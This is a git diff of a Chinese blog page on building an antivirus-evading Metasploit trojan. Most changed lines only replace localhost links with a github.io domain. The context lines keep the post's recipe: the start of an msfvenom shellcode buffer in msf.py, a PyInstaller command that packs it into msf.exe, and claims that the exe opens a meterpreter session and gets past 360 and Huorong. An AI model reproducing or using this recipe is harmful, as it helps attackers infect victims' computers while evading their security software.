@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>Metasploit生成免杀木马 | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="Metasploit生成免杀木马 | 过客 » Feed" href="http://localhost:4000/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="Metasploit生成免杀木马 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="Metasploit生成免杀木马"/>
-    <meta property="og:url" content="http://localhost:4000/post/metasploit-sheng-cheng-mian-sha-mu-ma/"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/metasploit-sheng-cheng-mian-sha-mu-ma/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="http://localhost:4000">过客</a>
+      <a class="navbar-brand" href="https://guokeya.github.io">过客</a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,7 +80,7 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="http://localhost:4000/tag/木马免杀/" class="tag">木马免杀</a>
+            <a href="https://guokeya.github.io/tag/木马免杀/" class="tag">木马免杀</a>
             
         </span>
             <h1>Metasploit生成免杀木马</h1>
@@ -109,10 +109,10 @@ pywin32<br>
 <p>下载地址:https://github.com/guokeya/tools<br>
 2.配置环境变量<br>
 将python的目录配置为环境变量。<br>
-<img src="http://localhost:4000/post-images/1577947811539.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1577947811539.png" alt="" loading="lazy"><br>
 免杀过程<br>
 1.用msfvenom生成木马<br>
-<img src="http://localhost:4000/post-images/1577947817925.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1577947817925.png" alt="" loading="lazy"><br>
 msf.py内容如下</p>
 <pre><code>buf =  b&quot;&quot;
 buf += b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;
@@ -223,17 +223,17 @@ shell()
 <pre><code>进入pyinstaller2.0目录，将修改后的msf.py也拖进去。编译
 python pyinstaller.py --console --onefile msf.py
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1577947842533.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1577947842533.png" alt="" loading="lazy"></figure>
 <p>这个msf.exe就是免杀木马<br>
 验证木马<br>
 msf监听端口，双击木马。成功返回meterpreter<br>
-<img src="http://localhost:4000/post-images/1577947858953.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1577947858953.png" alt="" loading="lazy"><br>
 能过360,火绒，电脑管家不能绕过<br>
-<img src="http://localhost:4000/post-images/1577947864642.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1577947864642.png" alt="" loading="lazy"></p>
 
           
           <p class="next-post">下一篇：
-            <a href="http://localhost:4000/post/redis-rce-lou-dong-fu-xian/">
+            <a href="https://guokeya.github.io/post/redis-rce-lou-dong-fu-xian/">
               <span class="post-title">
                 Redis RCE 漏洞复现&rarr;
               </span>
@@ -277,7 +277,7 @@ msf监听端口，双击木马。成功返回meterpreter<br>
             
               
               <li class="list-inline-item">
-              <a href="http://localhost:4000/atom.xml" target="_blank">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -292,10 +292,10 @@ msf监听端口，双击木马。成功返回meterpreter<br>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
